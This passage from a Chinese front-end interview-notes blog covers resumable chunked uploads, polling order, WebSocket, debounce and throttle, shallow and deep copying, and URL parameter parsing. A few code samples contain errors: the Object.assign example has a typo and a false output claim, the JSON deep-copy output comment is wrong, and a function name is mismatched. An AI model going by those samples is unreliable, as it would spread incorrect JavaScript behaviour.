class="line"></span><br></pre></td></tr></table></figure><h3 id="断点续传"><a href="#断点续传" class="headerlink" title="断点续传"></a>断点续传</h3><p>即使将大文件拆分成切片上传，我们仍需等待所有切片上传完毕，在等待过程中，可能发生一系列导致部分切片上传失败的情形，如网络故障、页面关闭等。由于切片未全部上传，因此无法通知服务端合成文件。这种情况下可以通过<strong>断点续传</strong>来进行处理。</p><p>断点续传指的是：可以从已经上传部分开始继续上传未完成的部分，而没有必要从头开始上传，节省上传时间。</p><p>由于整个上传过程是按<font color="#FF00FF">切片维度</font>进行的，且mkfile接口是在所有切片上传完成后由客户端主动调用的，因此断点续传的实现也十分简单：</p><ul><li>在切片上传成功后，保存已上传的切片信息</li><li>当下次传输相同文件时，遍历切片列表，只选择未上传的切片进行上传</li><li>所有切片上传完毕后，再调用mkfile接口通知服务端进行文件合并</li></ul><p>因此问题就落在了如何保存已上传切片的信息了，保存一般有两种策略</p><ul><li>可以通过locaStorage等方式保存在前端浏览器中，<font color="#FF00FF">这种方式不依赖于服务端，实现起来也比较方便，缺点在于如果用户清除了本地文件，会导致上传记录丢失</font></li><li>服务端本身知道哪些切片已经上传，因此可以由<font color="#FF00FF">服务端额外提供一个根据文件context查询已上传切片的接口，在上传文件前调用该文件的历史上传记录</font></li></ul><p><strong>通过在本地保存已上传切片记录，来实现断点上传的功能</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// 获取已上传切片记录</span><br><span class="line">function getUploadSliceRecord(context)&#123;</span><br><span class="line"> let record = localStorage.getItem(context)</span><br><span class="line"> if(!record)&#123;</span><br><span class="line"> return []</span><br><span class="line"> &#125;else &#123;</span><br><span class="line"> try&#123;</span><br><span class="line"> return JSON.parse(record)</span><br><span class="line"> &#125;catch(e)&#123;&#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">// 保存已上传切片</span><br><span class="line">function saveUploadSliceRecord(context, sliceIndex)&#123;</span><br><span class="line"> let list = getUploadSliceRecord(context)</span><br><span class="line"> list.push(sliceIndex)</span><br><span class="line"> localStorage.setItem(context, JSON.stringify(list))</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后对上传逻辑稍作修改，<font color="#FF00FF">主要是增加上传前检测是已经上传、上传后保存记录的逻辑</font></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">let context = createContext(file);</span><br><span class="line">// 获取上传记录</span><br><span class="line">let record = getUploadSliceRecord(context);</span><br><span class="line">let tasks = [];</span><br><span class="line">chunks.forEach((chunk, index) =&gt; &#123;</span><br><span class="line"> // 已上传的切片则不再重新上传</span><br><span class="line"> if(record.includes(index))&#123;</span><br><span class="line"> return</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line"> let fd = new FormData();</span><br><span class="line"> fd.append(&quot;file&quot;, chunk);</span><br><span class="line"> fd.append(&quot;context&quot;, context);</span><br><span class="line"> fd.append(&quot;chunk&quot;, index + 1);</span><br><span class="line"> let task = post(&quot;/mkblk.php&quot;, fd).then(res=&gt;&#123;</span><br><span class="line"> // 上传成功后保存已上传切片记录</span><br><span class="line"> saveUploadSliceRecord(context, index)</span><br><span class="line"> record.push(index)</span><br><span class="line"> &#125;)</span><br><span class="line"> tasks.push(task);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此时上传时刷新页面或者关闭浏览器，再次上传相同文件时，之前已经上传成功的切片就不会再重新上传了。</p><p>服务端实现断点续传的逻辑基本相似，只要在getUploadSliceRecord内部调用服务端的查询接口获取已上传切片的记录即可，因此这里不再展开。</p><p><strong>此外断点续传还需要考虑切片过期的情况</strong>：<font color="#FF8C00">如果调用了mkfile接口，则磁盘上的切片内容就可以清除掉了，如果客户端一直不调用mkfile的接口，放任这些切片一直保存在磁盘显然是不可靠的，一般情况下，切片上传都有一段时间的有效期，超过该有效期，就会被清除掉。基于上述原因，断点续传也必须同步切片过期的实现逻辑。</font></p><h3 id="上传进度和暂停"><a href="#上传进度和暂停" class="headerlink" title="上传进度和暂停"></a>上传进度和暂停</h3><p>**<font color="#FF8C00">通过xhr.upload中的progress方法可以实现监控每一个切片上传进度</font>**。</p><p>上传暂停的实现也比较简单，<font color="#FF8C00">通过xhr.abort可以取消当前未完成上传切片的上传</font>，实现上传暂停的效果，恢复上传就跟断点续传类似，先获取已上传的切片列表，然后重新发送未上传的切片。</p><h1 id="使用setInterval请求实时数据，返回顺序不一致怎么解决"><a href="#使用setInterval请求实时数据，返回顺序不一致怎么解决" class="headerlink" title="使用setInterval请求实时数据，返回顺序不一致怎么解决"></a>使用setInterval请求实时数据，返回顺序不一致怎么解决</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">setInterval(function() &#123;</span><br><span class="line">    $.get(&quot;/path/to/server&quot;, function(data, status) &#123;</span><br><span class="line">        console.log(data);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;, 10000);</span><br></pre></td></tr></table></figure><p>上面的程序会每隔10秒向服务器请求一次数据，并在数据到达后存储。这个实现方法通常可以满足简单的需求，然而同时也存在着很大的<font color="#FF00FF">缺陷</font>：在网络情况不稳定的情况下，服务器从接收请求、发送请求到客户端接收请求的总时间有可能超过10秒，而请求是以10秒间隔发送的，这样会导致接收的数据到达先后顺序与发送顺序不一致。<br><strong>解决方案：</strong></p><ol><li>使用setTimeout代替setInterval</li></ol><p>程序首先设置10秒后发起请求，<strong>当数据返回后</strong>再隔10秒发起第二次请求，以此类推。这样的话虽然无法保证两次请求之间的时间间隔为固定值，但是可以保证到达数据的顺序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function poll() &#123;</span><br><span class="line">    setTimeout(function() &#123;</span><br><span class="line">        $.get(&quot;/path/to/server&quot;, function(data, status) &#123;</span><br><span class="line">            console.log(data);</span><br><span class="line">            // 根据状态判断，发起下一次请求</span><br><span class="line">            poll();</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;, 10000);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="2"><li>WebSocket</li></ol><p>WebSocket 协议本质上是一个<font color="#FF00FF">基于 TCP 的协议</font>。</p><p>为了建立一个 WebSocket 连接，客户端浏览器首先要向服务器发起一个 HTTP 请求，<strong>这个请求和通常的 HTTP 请求不同，包含了一些附加头信息，其中附加头信息”Upgrade: WebSocket”表明这是一个申请协议升级的 HTTP 请求</strong>，服务器端解析这些附加的头信息然后产生应答信息返回给客户端，客户端和服务器端的 WebSocket 连接就建立起来了，双方就可以通过这个连接通道自由的传递信息，并且<font color="#FF00FF">这个连接会持续存在直到客户端或者服务器端的某一方主动的关闭连接。</font></p><p>服务器（Node.js）：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var WebSocketServer = require(&#x27;ws&#x27;).Server;</span><br><span class="line">var wss = new WebSocketServer(&#123;port: 8080&#125;);</span><br><span class="line"></span><br><span class="line">wss.on(&quot;connection&quot;, function(socket) &#123;</span><br><span class="line">    socket.on(&quot;message&quot;, function(msg) &#123;</span><br><span class="line">        console.log(msg);</span><br><span class="line">        socket.send(&quot;Nice to meet you!&quot;);</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>客户端同样可以使用Node.js或者是浏览器实现，这里选用浏览器作为客户端：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">// WebSocket 为客户端JavaScript的原生对象，浏览器中可用</span><br><span class="line">const WebSocket = require(&quot;ws&quot;);//控制台中写的所以需要引入ws</span><br><span class="line">var ws = new WebSocket(&quot;ws://localhost:8080&quot;);</span><br><span class="line">ws.onopen = function (event) &#123;</span><br><span class="line">  ws.send(&quot;Hello there!&quot;);</span><br><span class="line">&#125;;</span><br><span class="line">ws.onmessage = function (event) &#123;</span><br><span class="line">  console.log(event.data);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h1 id="防抖和节流的原理和使用场景"><a href="#防抖和节流的原理和使用场景" class="headerlink" title="防抖和节流的原理和使用场景"></a>防抖和节流的原理和使用场景</h1><p>函数防抖和函数节流：<strong>优化高频率执行js代码的一种手段</strong>，js中的一些事件如浏览器的<font color="#FF8C00">resize、scroll，鼠标的mousemove、mouseover，input输入框的keypress等事件在触发时，会不断地调用绑定在事件上的回调函数</font>，极大地浪费资源，降低前端性能。为了优化体验，需要对这类事件进行调用次数的限制。</p><h2 id="防抖"><a href="#防抖" class="headerlink" title="防抖"></a>防抖</h2><p><font color="#FF8C00">在事件被触发n秒后再执行回调，如果在这n秒内又被触发，则重新计时。</font><br>函数防抖关注一定时间连续触发的事件 <strong>，只在最后执行一次，而函数节流一段时间内只执行一次</strong></p><p>根据函数防抖思路设计出第一版的最简单的防抖代码：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var timer; // 维护同一个timer</span><br><span class="line">function debounce(fn, delay) &#123;</span><br><span class="line">    clearTimeout(timer);</span><br><span class="line">    timer = setTimeout(function()&#123;</span><br><span class="line">        fn();</span><br><span class="line">    &#125;, delay);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>上面例子中的debounce就是防抖函数，在document中鼠标移动的时候，会在onmousemove最后触发的1s后执行回调函数testDebounce；如果我们一直在浏览器中移动鼠标（比如10s），会发现会在10 + 1s后才会执行testDebounce函数（因为clearTimeout(timer)），这个就是函数防抖。</p><p>在上面的代码中，会出现一个问题，<font color="#FF00FF">var timer只能在setTimeout的父级作用域中，这样才是同一个timer，并且为了方便防抖函数的调用和回调函数fn的传参问题</font>，我们应该用闭包来解决这些问题。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">function debounce(fn, delay) &#123;</span><br><span class="line">  let timer = null; // 维护一个 timer</span><br><span class="line">  return function () &#123;</span><br><span class="line">    var _this = this; // 取debounce执行作用域的this</span><br><span class="line">    var args = arguments;</span><br><span class="line">    if (timer) &#123;</span><br><span class="line">      clearTimeout(timer);</span><br><span class="line">    &#125;</span><br><span class="line">    timer = setTimeout(function () &#123;</span><br><span class="line">      fn.apply(_this, args); // 用apply指向调用debounce的对象，相当于_this.fn(args);</span><br><span class="line">    &#125;, delay);</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function sayHello() &#123;</span><br><span class="line">  console.log(&quot;a, b, c&quot;);</span><br><span class="line">&#125;</span><br><span class="line">console.time(&quot;a&quot;);</span><br><span class="line">let db = debounce(sayHello, 1000);</span><br><span class="line">db();</span><br><span class="line">console.timeEnd(&quot;a&quot;);</span><br><span class="line"></span><br><span class="line">//a: 1ms</span><br><span class="line">//a: 0.952ms</span><br><span class="line">//a, b, c</span><br></pre></td></tr></table></figure><p>使用闭包后，解决传参和封装防抖函数的问题，这样就可以在其他地方随便将需要防抖的函数传入debounce了。</p><h2 id="节流"><a href="#节流" class="headerlink" title="节流"></a>节流</h2><p>连续触发事件，但是在具体的间隔秒数中只执行一次.</p><ul><li>定时器实现节流函数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay) &#123;</span><br><span class="line">    var timer;</span><br><span class="line">    return function () &#123;</span><br><span class="line">        var _this = this;</span><br><span class="line">        var args = arguments;</span><br><span class="line">        if (timer) &#123;</span><br><span class="line">            return;</span><br><span class="line">        &#125;</span><br><span class="line">        timer = setTimeout(function () &#123;</span><br><span class="line">            fn.apply(_this, args);</span><br><span class="line">            timer = null; // 在delay后执行完fn之后清空timer，此时timer为假，throttle触发可以进入计时器</span><br><span class="line">        &#125;, delay)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li>时间戳实现节流函数：</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">function throttle(fn, delay) &#123;</span><br><span class="line">    var previous = 0;</span><br><span class="line">    // 使用闭包返回一个函数并且用到闭包函数外面的变量previous</span><br><span class="line">    return function() &#123;</span><br><span class="line">        var _this = this;</span><br><span class="line">        var args = arguments;</span><br><span class="line">        var now = new Date();</span><br><span class="line">        if(now - previous &gt; delay) &#123;</span><br><span class="line">            fn.apply(_this, args);</span><br><span class="line">            previous = now;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="异同比较"><a href="#异同比较" class="headerlink" title="异同比较"></a>异同比较</h2><p><strong>相同点：</strong></p><ul><li>都可以通过使用 setTimeout 实现。</li><li>目的都是，降低回调执行频率。节省计算资源。</li></ul><p><strong>不同点：</strong></p><ul><li>函数防抖，<strong>在一段连续操作结束后，处理回调</strong>，<strong>利用clearTimeout 和 setTimeout实现</strong>。函数节流，<strong>在一段连续操作中，每一段时间只执行一次，</strong> 频率较高的事件中使用来提高性能。</li><li>函数防抖关注一定时间连续触发的事件只在最后执行一次，而函数节流侧重于一段时间内只执行一次。</li></ul><p><strong>常见应用场景</strong></p><p>函数<font color="#FF8C00">防抖</font>的应用场景:</p><p>连续的事件，只需触发一次回调的场景有：</p><ul><li>搜索框搜索输入。只需用户最后一次输入完，再发送请求</li><li>手机号、邮箱验证输入检测</li><li>窗口大小Resize。只需窗口调整完成后，计算窗口大小。防止重复渲染。</li></ul><p>函数<font color="#FF8C00">节流</font>的应用场景:</p><p>间隔一段时间执行一次回调的场景有：</p><ul><li><strong>滚动加载</strong>，加载更多或滚到底部监听</li><li>谷歌搜索框，搜索联想功能</li><li>高频点击提<strong>交，表单重复提交</strong></li></ul><h1 id="浅拷贝，深拷贝-实现方式"><a href="#浅拷贝，深拷贝-实现方式" class="headerlink" title="浅拷贝，深拷贝(实现方式)"></a>浅拷贝，深拷贝(实现方式)</h1><p>浅拷贝和深拷贝都只针对于引用数据类型，浅拷贝只复制指向某个对象的指针，而不复制对象本身，新旧对象还是共享同一块内存；但深拷贝会另外创造一个一模一样的对象，新对象跟原对象不共享内存，修改新对象不会改到原对象；</p><p>区别：浅拷贝只复制对象的第一层属性、深拷贝可以对对象的属性进行<font color="#FF8C00">递归复制</font>；</p><h2 id="实现浅拷贝方法"><a href="#实现浅拷贝方法" class="headerlink" title="实现浅拷贝方法"></a>实现浅拷贝方法</h2><ol><li>Object.assign方法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">var obj = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    b: 2</span><br><span class="line">&#125;</span><br><span class="line">var obj1 = Object.assign(&#123;&#125;,obj);</span><br><span class="line">boj1.a = 3;</span><br><span class="line">console.log(obj.a) // 3</span><br></pre></td></tr></table></figure><ol start="2"><li>for in方法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">// 只复制第一层的浅拷贝</span><br><span class="line">function simpleCopy(obj1) &#123;</span><br><span class="line">   var obj2 = Array.isArray(obj1) ? [] : &#123;&#125;;</span><br><span class="line">   for (let i in obj1) &#123;</span><br><span class="line">   obj2[i] = obj1[i];</span><br><span class="line">  &#125;</span><br><span class="line">   return obj2;</span><br><span class="line">&#125;</span><br><span class="line">var obj1 = &#123;</span><br><span class="line">   a: 1,</span><br><span class="line">   b: 2,</span><br><span class="line">   c: &#123;</span><br><span class="line">         d: 3</span><br><span class="line">      &#125;</span><br><span class="line">&#125;</span><br><span class="line">var obj2 = simpleCopy(obj1);</span><br><span class="line">obj2.a = 3;</span><br><span class="line">obj2.c.d = 4;</span><br><span class="line">alert(obj1.a); // 1</span><br><span class="line">alert(obj2.a); // 3</span><br><span class="line">alert(obj1.c.d); // 4</span><br><span class="line">alert(obj2.c.d); // 4</span><br></pre></td></tr></table></figure><h2 id="实现深拷贝方法"><a href="#实现深拷贝方法" class="headerlink" title="实现深拷贝方法"></a>实现深拷贝方法</h2><ol><li>采用递归去拷贝所有层级属性</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function deepClone(obj)&#123;</span><br><span class="line">    let objClone = Array.isArray(obj)?[]:&#123;&#125;;</span><br><span class="line">    if(obj &amp;&amp; typeof obj===&quot;object&quot;)&#123;</span><br><span class="line">        for(key in obj)&#123;</span><br><span class="line">            if(obj.hasOwnProperty(key))&#123;</span><br><span class="line">                //判断ojb子元素是否为对象，如果是，递归复制</span><br><span class="line">                if(obj[key]&amp;&amp;typeof obj[key] ===&quot;object&quot;)&#123;</span><br><span class="line">                    objClone[key] = deepClone(obj[key]);</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    //如果不是，简单复制</span><br><span class="line">                    objClone[key] = obj[key];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return objClone;</span><br><span class="line">&#125;    </span><br><span class="line">let a=[1,2,3,4],</span><br><span class="line">    b=deepClone(a);</span><br><span class="line">a[0]=2;</span><br><span class="line">console.log(a,b);</span><br></pre></td></tr></table></figure><ol start="2"><li>使用JSON.stringify和JSON.parse实现深拷贝：JSON.stringify把对象转成字符串，再用JSON.parse把字符串转成新的对象；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function deepCopy(obj1)&#123;</span><br><span class="line">    let _obj = JSON.stringify(obj1);</span><br><span class="line">    let obj2 = JSON.parse(_obj);</span><br><span class="line">    return obj2;</span><br><span class="line">  &#125;</span><br><span class="line">    var a = [1, [1, 2], 3, 4];</span><br><span class="line">    var b = deepCopy(a);</span><br><span class="line">    b[1][0] = 2;</span><br><span class="line">    alert(a); // 1,1,2,3,4</span><br><span class="line">    alert(b); // 2,2,2,3,4</span><br></pre></td></tr></table></figure><ol start="3"><li>热门的函数库lodash，也有提供_.cloneDeep用来做深拷贝；</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">var _ = require(&#x27;lodash&#x27;);</span><br><span class="line">var obj1 = &#123;</span><br><span class="line">    a: 1,</span><br><span class="line">    b: &#123; f: &#123; g: 1 &#125; &#125;,</span><br><span class="line">    c: [1, 2, 3]</span><br><span class="line">&#125;;</span><br><span class="line">var obj2 = _.cloneDeep(obj1);</span><br><span class="line">console.log(obj1.b.f === obj2.b.f);</span><br><span class="line">// false</span><br></pre></td></tr></table></figure><h1 id="获取当前页面url"><a href="#获取当前页面url" class="headerlink" title="获取当前页面url"></a>获取当前页面url</h1><h2 id="通过window-location"><a href="#通过window-location" class="headerlink" title="通过window.location"></a>通过window.location</h2><ol><li>window.location.href (设置或获取整个 URL 为字符串)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.href;</span><br></pre></td></tr></table></figure><ol start="2"><li>window.location.protocol (设置或获取 URL 的协议部分)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.protocol;</span><br></pre></td></tr></table></figure><ol start="3"><li>window.location.host (设置或获取 URL 的主机部分)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.host;</span><br></pre></td></tr></table></figure><ol start="4"><li>window.location.port (设置或获取与 URL 关联的端口号码)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.port;</span><br></pre></td></tr></table></figure><ol start="5"><li>window.location.pathname (设置或获取与 URL 的路径部分（就是文件地址）)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.pathname;</span><br></pre></td></tr></table></figure><ol start="6"><li>window.location.search (设置或获取 href 属性中跟在问号后面的部分)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.search;</span><br></pre></td></tr></table></figure><ol start="7"><li>window.location.hash (设置或获取 href 属性中在井号“#”后面的分段)</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var test = window.location.hash;</span><br></pre></td></tr></table></figure><h2 id="js获取url中参数值"><a href="#js获取url中参数值" class="headerlink" title="js获取url中参数值"></a>js获取url中参数值</h2><ol><li>正则法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"> function getQueryString(name) &#123;</span><br><span class="line">          var reg = new RegExp(&#x27;(^|&amp;)&#x27; + name + &#x27;=([^&amp;]*)(&amp;|$)&#x27;, &#x27;i&#x27;);</span><br><span class="line">          var r = window.location.search.substr(1).match(reg);</span><br><span class="line"></span><br><span class="line">          if (r != null) &#123;</span><br><span class="line">             return unescape(r[2]);</span><br><span class="line">          &#125;</span><br><span class="line">          return null;</span><br><span class="line">  &#125;</span><br><span class="line">// 这样调用：</span><br><span class="line">alert(GetQueryString(&quot;参数名1&quot;));</span><br><span class="line">alert(GetQueryString(&quot;参数名2&quot;));</span><br><span class="line">alert(GetQueryString(&quot;参数名3&quot;));</span><br></pre></td></tr></table></figure><ol start="2"><li>split拆分法</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">function GetRequest() &#123;</span><br><span class="line">         var url = location.search; //获取url中&quot;?&quot;符后的字串</span><br><span class="line">         var theRequest = new Object();</span><br><span class="line"></span><br><span class="line">         if (url.indexOf(&quot;?&quot;) != -1) &#123;</span><br><span class="line">                 var str = url.substr(1);</span><br><span class="line">                 strs = str.split(&quot;&amp;&quot;);</span><br><span class="line">              for(var i = 0; i &lt; strs.length; i ++) &#123;</span><br><span class="line">                      theRequest[strs[i].split(&quot;=&quot;)[0]] = unescape(strs[i].split(&quot;=&quot;)[1]);</span><br><span class="line">               &#125;</span><br><span class="line">         &#125;</span><br><span class="line">     return theRequest;</span><br><span class="line"> &#125;</span><br><span class="line">var Request = new Object();</span><br><span class="line">Request = GetRequest();&lt;br&gt;// var id=Request[&quot;id&quot;]; </span><br><span class="line">// var 参数1,参数2,参数3,参数N;</span><br><span class="line">// 参数1 = Request[&#x27;参数1&#x27;];</span><br><span class="line">// 参数2 = Request[&#x27;参数2&#x27;];</span><br><span class="line">// 参数3 = Request[&#x27;参数3&#x27;];</span><br><span class="line">// 参数N = Request[&#x27;参数N&#x27;];</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>指定取某个键对应的值</strong><br>比如说一个url：<a href="http://i.cnblogs.com/?j=js">http://i.cnblogs.com/?j=js</a>, 我们想得到参数j的值，可以通过以下函数调用。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function GetQueryString(name) &#123; </span><br><span class="line">         var reg = new RegExp(&quot;(^|&amp;)&quot; + name + &quot;=([^&amp;]*)(&amp;|$)&quot;, &quot;i&quot;); </span><br><span class="line">         var r = window.location.search.substr(1).match(reg); //获取url中&quot;?&quot;符后的字符串并正则匹配</span><br><span class="line">         var context = &quot;&quot;; </span><br><span class="line"></span><br><span class="line">     if (r != null) </span><br><span class="line">     context = r[2]; </span><br><span class="line">    reg = null; </span><br><span class="line">    r = null; </span><br><span class="line">    return context == null || context == &quot;&quot; || context == &quot;undefined&quot; ? &quot;&quot; : context; </span><br><span class="line"> &#125;</span><br><span class="line">alert(GetQueryString(&quot;j&quot;));</span><br></pre></td></tr></table></figure><p><strong>单个参数的获取方法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function GetRequest() &#123;</span><br><span class="line">         var url = location.search; //获取url中&quot;?&quot;符后的字串</span><br><span class="line">         if (url.indexOf(&quot;?&quot;) != -1) &#123;? //判断是否有参数</span><br><span class="line">                  var str = url.substr(1); 